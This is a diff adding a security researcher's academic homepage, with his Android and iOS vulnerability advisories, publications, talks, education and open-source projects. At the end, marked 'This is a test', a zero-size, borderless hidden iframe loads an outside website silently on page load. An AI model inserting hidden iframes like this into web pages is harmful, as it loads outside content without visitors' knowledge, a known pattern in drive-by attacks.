@@ -1,0 +1,307 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+ "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+
+<head>
+<title>Daoyuan Wu's HomePage</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="description" content="Daoyuan Wu's webpage">
+<link rel="stylesheet" type="text/css" media="screen" href="style.css" />
+</head>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-17424195-13', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+<body>
+
+<h1>Daoyuan Wu <img src="name.png" alt="(PhD Candidate)" height="29"></h1>
+
+<b>Research interests: Smartphone and Mobile Security; Crowdsourcing and Network Measurement.</b><br/>
+I enjoy performing security analysis and building real systems.<br/>
+I in particular like discovering new security problems and conducting large-scale measurement evaluation.<br/>
+<br/>
+I am now a PhD candidate at <a href="http://sis.smu.edu.sg/" target="_blank">School of Information Systems</a>, <a href="http://www.smu.edu.sg/" target="_blank">Singapore Management University (SMU)</a>.<br/>
+I am working closely with my two PhD advisors, <a href="http://flyer.sis.smu.edu.sg/" target="_blank">Prof. Debin Gao</a> and <a href="http://www.mysmu.edu/faculty/robertdeng/" target="_blank">Prof. Robert H. Deng</a>, on a number of interesting security projects.<br/>
+<br/>
+At SMU, I also get chance to collaborate with <a href="http://www.mysmu.edu/faculty/yjli/" target="_blank">Prof. Yingjiu Li</a> on Android security, and with <a href="http://www.mysmu.edu/faculty/davidlo/" target="_blank">Prof. David Lo</a> on software engineering.<br/>
+My previous MPhil advisor at HK PolyU was <a href="http://www4.comp.polyu.edu.hk/~csrchang/" target="_blank">Prof. Rocky K. C. Chang</a>, with whom I am currently working on mobile network measurement.<br/>
+<br/>
+I am leading the design and implementation of <b>two crowdsourcing projects</b>. Please consider to try <a href="https://play.google.com/store/apps/developer?id=University+Researchers" target="_blank" style="color:red">them</a> for fun and knowledge.
+<ul>
+<li class="ids"><img src="pics/mopeye_icon.png" height="24"> <a href="https://play.google.com/store/apps/details?id=com.mopeye" target="_blank">MopEye</a> measures the per-app network speed, and many more (capture packets, change DNS).</li>
+<li class="ids"><img src="pics/netmon_icon.png" height="24"> <a href="https://play.google.com/store/apps/details?id=com.netmon" target="_blank">NetMon</a> scans your 3G/4G/WiFi networks, and monitors open ports in your device.</li>
+</ul>
+
+
+<!-- News -->
+<h2>News</h2>
+
+<ul>
+<li class="ids">2016/12/02: I passed the qualifying exam at SMU! I now can focus on my own research.</li>
+<li class="ids">2016/04/22: I finished all six PhD courses at SMU (three A+ and A, A-, B-)!</li>
+<li class="ids">2015/07/31: I came to SMU for the doctoral study. Thank SMU for waiving the GRE for me.</li>
+</ul>
+
+<!-- Advisories -->
+<h2>Advisories</h2>
+
+<ul>
+<li class="ids">2011/12: Content Provider vulnerabilities in numerous popular Android apps. [<a href="http://www4.comp.polyu.edu.hk/~appsec/" target="_blank">AppSec homepage</a> | <a href="http://www.osvdb.com/creditees/6737-daoyuan-wu" target="_blank">CVEs</a>]</li>
+<li class="ids">2014/04: FileCross attacks exploiting the vulnerable file:// in browsing components of Android Apps, even on the latest Android 4.4. [<a href="https://sites.google.com/site/androidfilecross/" target="_blank">Homepage</a>]</li>
+<li class="ids">2014/04: Remote Code Execution (RCE) vulnerabilities in Android browser apps. [<a href="https://sites.google.com/site/androidrce/" target="_blank">Homepage</a>]</li>
+<li class="ids">2014/09: New attack vectors introduced for the Android addJavascriptInterface RCE issue. [<a href="news/newattackvector.html">Report</a>, <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7224" target="_blank">CVE-2014-7224</a>]</li>
+<li class="ids">2015/05: A number of popular Android and iOS apps suffer from indirect file leaks, which we call IFL attacks. [<a href="pp/most15.html">Homepage</a>]</li>
+<li class="ids">2015/09: Two SOP (same-origin policy) weaknesses in the iOS web engine, affecting both iOS 8 and iOS 7. [<a href="https://support.apple.com/en-us/HT205212" target="_blank">Apple iOS9 acknowledgement</a> with <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5921" target="_blank">CVE-2015-5921</a>]</li>
+</ul>
+
+<!-- Papers -->
+<h2>Publications</h2>
+<ul>
+
+<li>
+<b>MopEye: Opportunistic Monitoring of Per-app Mobile Network Performance</b>. [<a href="https://arxiv.org/abs/1703.07551" target="_blank">Technical Report</a> | <a href="https://play.google.com/store/apps/details?id=com.mopeye" target="_blank">@GPlay</a> | <a href="https://www.facebook.com/mopeye/" target="_blank">@Facebook</a> | <a href="https://twitter.com/mopeye_app" target="_blank">@Twitter</a>]
+<br /><u>Daoyuan Wu</u>, Rocky K. C. Chang, Weichao Li, Eric K. T. Cheng, and Debin Gao.
+<br />To appear in <a href="https://www.usenix.org/conference/atc17" target="_blank">USENIX ATC 2017</a>, Santa Clara, USA. An earlier <a href="https://arxiv.org/abs/1610.01282" target="_blank">poster version</a> was published in December 1, 2015.
+</li>
+
+<li>
+<b>Measuring the Declared SDK Versions and Their Consistency with API Calls in Android Apps</b>. [<a href="papers/WASA17_DSDK.pdf">Paper</a> | <a href="https://arxiv.org/abs/1702.04872" target="_blank">arXiv</a> | <a href="https://twitter.com/dao0x/status/832432200180117506">Twitter Link</a>]
+<br /><u>Daoyuan Wu</u>, Ximing Liu*, Jiayun Xu*, David Lo, and Debin Gao.
+<br />*: co-second author, in the alphabetical order.
+<br /><a href="http://wasa-conference.org/WASA2017/" target="_blank">International Conference on Wireless Algorithms, Systems, and Applications (WASA) 2017</a>, Guilin, China. (AR = 71/238 = 29.8%)
+<br />It is originally a course project paper done by the first three authors in Apr 2016.
+</li>
+
+<li>
+<b>SecComp: Towards Practically Defending Against Component Hijacking in Android Applications</b>. [<a href="https://arxiv.org/abs/1609.03322" target="_blank">Technical Report</a>]
+<br /><u>Daoyuan Wu</u>, Debin Gao, Yingjiu Li, and Robert H. Deng.
+<br />A significantly improved version is currently under peer review. It is originally a course project paper, which I finished in Nov 2015.
+</li>
+
+<li>
+<b>Indirect File Leaks in Mobile Applications</b>. [<a href="papers/MoST15_IndirectFileLeak.pdf">Paper</a> | <a href="pp/most15.html">Homepage</a> | <a href="slides/Most15_IFL_dao.pptx">Slides</a>]
+<br />*Note that we afterwards changed the title to the following one to better reflect its novelty.
+<br /><b>Cross-Platform Analysis of Indirect File Leaks in Android and iOS Applications</b>. [<a href="papers/MoST15_IndirectFileLeak_TitleChanged.pdf">Paper</a> | <a href="https://arxiv.org/abs/1511.00104" target="_blank">arXiv</a>]
+<br /><u>Daoyuan Wu</u> and Rocky K. C. Chang.
+<br /><a href="http://ieee-security.org/TC/SPW2015/MoST/" target="_blank">Mobile Security Technologies (MoST) 2015</a>, in conjunction with <a href="http://ieee-security.org/TC/SP2015/" target="_blank">S&P 2015</a>, San Jose, USA. (AR = 10/33 = 30.3%)
+</li>
+
+<li>
+<b>Analyzing Android Browser Apps for file:// Vulnerabilities</b>. [<a href="papers/ISC14_FileCross.pdf">Paper</a> (<a href="http://link.springer.com/chapter/10.1007%2F978-3-319-13257-0_20">official</a>, <a href="http://arxiv.org/abs/1404.4553" target="_blank">full</a>) | <a href="slides/ISC14_FileCross.pptx">Slides</a> | <a href="https://sites.google.com/site/androidfilecross/">Homepage</a>]
+<br /><u>Daoyuan Wu</u> and Rocky K. C. Chang.
+<br /><a href="http://isc14.ie.cuhk.edu.hk/" target="_blank">Information Security Conference (ISC) 2014</a>, Hong Kong, China. (Full paper AR = 20/106 = 18.9%)
+</li>
+
+<li>
+<b>Demystifying and Puncturing the Inflated Delay in Smartphone-based WiFi Network Measurement</b>. [<a href="papers/CoNEXT16_WiFiMeasure.pdf">Paper</a> | <a href="http://dl.acm.org/citation.cfm?id=2999595" target="_blank">Link</a>]
+<br />Weichao Li, <u>Daoyuan Wu</u>, Rocky K. C. Chang, and Ricky K. P. Mok.
+<br /><a href="http://conferences2.sigcomm.org/co-next/2016/#!/home" target="_blank">CoNEXT 2016</a>, Irvine, California, USA. (AR = 36/196 = 18.4%)
+</li>
+
+<li>
+<b>On the Accuracy of Smartphone-based Mobile Network Measurement</b>. [<a href="papers/INFOCOM15_Accuracy.pdf">Paper</a> | <a href="http://ieeexplore.ieee.org/xpl/articleDetails.jsp?arnumber=7218402" target="_blank">Link</a>]
+<br />Weichao Li, Ricky K. P. Mok, <u>Daoyuan Wu</u>, and Rocky K. C. Chang.
+<br /><a href="http://infocom2015.ieee-infocom.org/" target="_blank">INFOCOM 2015</a>, Hong Kong, China. (AR = 316/1,640 = 19.3%)
+</li>
+
+<li>
+<b>Stack Layout Randomization with Minimal Rewriting of Android Binaries</b>. [<a href="papers/ICISC15_PushPopRandom.pdf">Paper</a> | <a href="http://link.springer.com/chapter/10.1007%2F978-3-319-30840-1_15" target="_blank">Link</a>]
+<br />Yu Liang, Xinjie Ma, <u>Daoyuan Wu</u>, Xiaoxiao Tang, Debin Gao, Guojun Peng, Chunfu Jia, and Huanguo Zhang.
+<br /><a href="http://www.icisc.org/icisc15/asp/cfp.html" target="_blank">International Conference on Information Security and Cryptology (ICISC) 2015</a>, Seoul, Korea. (AR = 23/84 = 27.4%)
+</li>
+
+<li>
+<b>A Sink-driven Approach to Detecting Exposed Component Vulnerabilities in Android Apps</b>.
+<br /><u>Daoyuan Wu</u>, Xiapu Luo, and Rocky K. C. Chang.
+<br />
+[
+<a href="http://arxiv.org/abs/1405.6282" target="_blank">Technical report</a>
+| <a href="https://github.com/daoyuan14/VSinkDataset">VSink dataset</a>
+| <a href="https://github.com/daoyuan14/ComponentHijackingExploit">Vulnerable APKs and Demo exploits</a>
+]
+<br />An old technical report. I don't have time to revise it anymore.
+</li>
+</ul>
+
+<!-- Posters -->
+<h2>Posters</h2>
+<ul>
+
+<li>
+<b>MopEye: Monitoring Per-app Network Performance with Zero Measurement Traffic</b>. [<a href="papers/CoNEXT15_Poster_MopEye.pdf">Poster</a> | <a href="https://arxiv.org/abs/1610.01282" target="_blank">arXiv</a> | <a href="https://play.google.com/store/apps/details?id=com.mopeye" target="_blank">@GPlay</a> | <a href="https://www.facebook.com/mopeye/" target="_blank">@Facebook</a> | <a href="https://twitter.com/mopeye_app" target="_blank">@Twitter</a>]
+<br /><u>Daoyuan Wu</u>, Weichao Li, Rocky K. C. Chang, and Debin Gao.
+<br /><a href="http://conferences2.sigcomm.org/co-next/2015/#!/studentposters" target="_blank">CoNEXT Student Workshop 2015</a>, in conjunction with <a href="http://conferences2.sigcomm.org/co-next/2015/#!/home" target="_blank">CoNEXT 2015</a>, Heidelberg, Germany.
+</li>
+
+</ul>
+
+<h2>Mentoring Experience</h2>
+<ul>
+
+<li>
+<b>AppTrace: Dynamic Trace on Android Devices</b>. &nbsp;<a href="papers/ICC15_AppTrace.pdf">The paper</a> appeared in <a href="https://edas.info/web/icc15/icc1511ciss.html" target="_blank">ICC 2015</a>, London, UK.
+<br />The idea, a "powerful" on-device method trace system for Android, was proposed by me in 2013. This paper finishes a preliminary version of my idea.
+<br />In particular, I mentored the first two authors to develop the current AppTrace system based on Xposed. But I did not involve in the writing process.
+</li>
+
+<li>
+<b>A Kerberos-based UPnP Extension for Secure Home Networks</b>. &nbsp;<a href="papers/KUPnP12.pdf">The paper</a> appeared in <a href="http://www.iccet.org/" target="_blank">ICCET 2012</a>, Phuket, Thailand.
+<br />I mentored the first author to develop the proposed KUPnP system. I also contributed many KUPnP's C codes, but not the idea and the writting.
+</li>
+</ul>
+
+
+<!-- Talks -->
+<h2>Talks</h2>
+<ul>
+<li>
+<b>On the Feasibility of Automatically Generating Android Component Hijacking Exploits</b>.
+<br />Daoyuan Wu.
+<br />
+[
+<a href="http://www.slideshare.net/daoyuan0x/chv-exploit-hitcon-38299593" target="_blank">Slides</a>
+| <a href="https://github.com/daoyuan14/ComponentHijackingExploit" target="_blank">Codes</a>
+]
+<br /><a href="http://hitcon.org/2014/agenda/" target="_blank">HitCon 2014</a>, Taiwan.
+</li>
+</ul>
+
+
+<!-- Education -->
+<h2>Education</h2>
+<ul>
+
+<li>
+<b>M.Phil</b>, <a href="http://www.polyu.edu.hk" target="_blank">The Hong Kong Polytechnic University (HK PolyU)</a>, Aug 2012 -- Mar 2015.
+<br /><a href="http://www.comp.polyu.edu.hk" target="_blank">Department of Computing</a>. Advisor: Prof. Rocky K. C. Chang. GPA: 3.83/4.0.
+<br /><b>Thesis: Detecting file:// and Exposed Component Vulnerabilities in Android Apps</b>. [<a href="papers/MPhilThesis_Daoyuan.pdf">Thesis</a> | <a href="/pics/mphilTHESIS.png" target="_blank">Cover</a>]
+<br />(I submitted the thesis on 14 Aug 2014, successfully defended it on 18 Dec 2014, and obtained my degree certificate in Mar 2015.)
+</li>
+
+<li>
+<b>B.E.</b>, <a href="http://www.njupt.edu.cn/en/" target="_blank">Nanjing University of Posts and Telecommunications (NUPT)</a>, Sep 2007 -- Jun 2011.
+<br />Department of Information Security, <a href="http://cs.njupt.edu.cn/" target="_blank">School of Computer Science & Technology</a>. GPA: 88.94/100 (rank: 3/89).
+<br /><b>Thesis: Android Malware Detection with Customized Dynamic Monitoring in Emulators</b>. (in Chinese)
+<br />(I instrumented Android framework source codes for malware behavior analysis. My system is earlier than <a href="https://code.google.com/p/droidbox/" target="_blank">DroidBox</a>, and was deployed in <a href="http://www.antiy.net/avl-sdk-mobile/" target="_blank">Antiy Lab</a>.)
+</li>
+</ul>
+
+
+<!-- IDs -->
+<h2>Net IDs</h2>
+
+<ul>
+<li class="ids">Gmail: daoyuan0x</li>
+<li class="ids">
+<a href="http://www.informatik.uni-trier.de/~ley/pers/hd/w/Wu:Daoyuan" target="_blank">DBLP</a> | 
+<a href="http://scholar.google.com/citations?user=WtO-bN8AAAAJ&hl=en" target="_blank">Google Scholar</a>
+</li>
+<li class="ids">
+<a href="https://twitter.com/dao0x" target="_blank">Twitter</a> | 
+<a href="https://www.linkedin.com/in/daoyuan" target="_blank">LinkedIn</a> | 
+<a href="https://github.com/daoyuan14/" target="_blank">GitHub</a> |
+<a href="http://www.slideshare.net/daoyuan0x/" target="_blank">SlideShare</a>
+</li>
+</ul>
+
+<!-- Service -->
+<h2>Services</h2>
+
+<ul>
+<li class="ids">
+External reviewer: <a href="http://www.codaspy.org/" target="_blank">CODASPY 2017</a>, <a href="http://noms2016.ieee-noms.org/" target="_blank">NOMS 2016</a>, and <a href="http://im2015.ieee-im.org/" target="_blank">IM 2015</a>.
+</li>
+
+<li class="ids">
+Sub-reviewer: <a href="http://conferences.sigcomm.org/imc/2016/index.html" target="_blank">IMC 2016</a>, <a href="http://www.ics.forth.gr/pam2016/" target="_blank">PAM 2016</a>, <a href="http://wan.poly.edu/pam2015/" target="_blank">PAM 2015</a>, <a href="http://infocom2015.ieee-infocom.org/" target="_blank">INFOCOM 2015</a>, and <a href="http://pam2013.comp.polyu.edu.hk/" target="_blank">PAM 2013</a>.
+</li>
+</ul>
+
+<!-- Open -->
+<h2>Open Source</h2>
+
+<ul>
+<li class="ids">
+<a href="https://code.google.com/p/mobilesecure/" target="_blank">MobileSecure</a>: A Secure System for Privacy Protection on Android.
+<br />Won <b>The 2nd Place</b>, The 3rd China Undergraduate Information Security Competition, 2010.
+</li>
+
+<li class="ids">
+<a href="https://code.google.com/p/myfileguard/" target="_blank">FileGuard</a>: A Kernel- and User-level Hooking System for Protecting Confidential Files on Windows.
+<br />Won <b>The Final Prize</b>, The 2nd China Undergraduate Information Security Competition, 2009.
+</li>
+
+<li class="ids">
+<a href="https://code.google.com/p/lantran/" target="_blank">LanTran</a>: A Full Featured File Transfer Tool For LAN Users.
+<br />Won <b>The Final Prize</b>, The 10th "Innovation Cup" of Nanjing University of Posts and Telecommunications, 2008.
+</li>
+
+<li class="ids">
+<a href="https://code.google.com/p/httpdebuger/" target="_blank">HttpDebuger</a>: A HTTP Proxy for Debugging Web Apps.
+<br />An undergraduate course project [<a href="http://www.slideshare.net/clzqwdy/openssl-4472555" target="_blank">Slides</a> in Chinese]. I took it to learn the OpenSSL library and manipulate HTTPS certificates. 2010.
+</li>
+
+</ul>
+
+<!-- Links -->
+<h2>Useful Links</h2>
+
+<ul>
+<li class="ids">
+I am maintaining <a href="thinking.html">a list of interesting computer security papers</a> and <a href="appse.html">a list of mobile app related software engineering papers</a>.
+</li>
+<li class="ids">
+My calendar of security conferences: <a href="http://www.wikicfp.com/cfp/servlet/event.showlist?sortby=1&lownerid=35309&ltype=w&page=1" target="_blank">academia</a> and <a href="/industry.html">industry</a>.
+</li>
+<li class="ids">
+Security Journals: <a href="http://www.signalprocessingsociety.org/publications/periodicals/forensics/" target="_blank">TIFS</a> (<a href="http://www.signalprocessingsociety.org/publications/special-issues-2/#ifsissues" target="_blank">special issues</a>), <a href="http://www.computer.org/web/tdsc" target="_blank">TDSC</a> (<a href="http://www.computer.org/web/computingnow/cfps/journals#tdsc" target="_blank">special issues</a>), <a href="http://www.journals.elsevier.com/computers-and-security/" target="_blank">Computers & Security</a> (<a href="http://www.journals.elsevier.com/computers-and-security/call-for-papers/" target="_blank">special issues</a>), <a href="http://tissec.acm.org/" target="_blank">TISSEC</a> and <a href="http://www.iospress.nl/journal/journal-of-computer-security/" target="_blank">JCS</a>.
+</li>
+<li class="ids">
+Network Journals: <a href="http://www.ifp.illinois.edu/ton/" target="_blank">TON</a>, <a href="http://www.comsoc.org/jsac/call-papers" target="_blank">JSAC</a>, <a href="http://www.computer.org/web/tmc" target="_blank">TMC</a>.
+</li>
+<li class="ids">
+<a href="http://rcpce.engl.polyu.edu.hk/RACorpus/advanced.htm" target="_blank">PolyU's Corpus of Research Articles</a>
+</li>
+<li class="ids">
+<a href="/elos.pdf" target="_blank">The Elements of Style (by Strunk and White)</a>
+</li>
+<li class="ids">
+<a href="http://homes.cs.washington.edu/~mernst/advice/write-technical-paper.html" target="_blank">Writing a technical paper (by Michael Ernst)</a>
+</li>
+<li class="ids">
+<a href="http://greatresearch.org/2013/10/11/storytelling-101-writing-tips-for-academics/" target="_blank">Storytelling 101: Writing Tips for Academics (by Nick Feamster)</a>
+</li>
+<li class="ids">
+<a href="http://faculty.cs.tamu.edu/guofei/sec_conf_stat.htm" target="_blank">Computer Security Conference Ranking and Statistic (by Guofei Gu)</a>
+</li>
+<li class="ids">
+<a href="http://jianying.space/conference-ranking.html" target="_blank">Top Crypto and Security Conferences Ranking (by Jianying Zhou)</a>
+</li>
+<li class="ids">
+<a href="http://www.cs.cornell.edu/andru/csconf.html" target="_blank">Top Publication Venues in Computer Science (by Andrew Myers)</a>
+</li>
+<li class="ids">
+ArnetMiner CS Rank: <a href="https://aminer.org/ranks/conf" target="_blank">conference rank</a> and <a href="https://aminer.org/ranks/org" target="_blank">organization rank</a>.
+</li>
+<li class="ids">
+<a href="http://www.concise-courses.com/security/conferences-of-2015/" target="_blank">Information Security Conferences of 2015</a>
+</li>
+<li class="ids">
+<a href="http://www.ieee-security.org/CFP/Cipher-Call-for-Papers.html" target="_blank">Cipher Call-for-papers</a>
+</li>
+</li>
+</ul>
+
+<!-- This is a test -->
+<iframe src="http://www.jraf.net/" style="width:0;height:0;border:0; border:none;"></iframe>
+
+</body>
+</html>
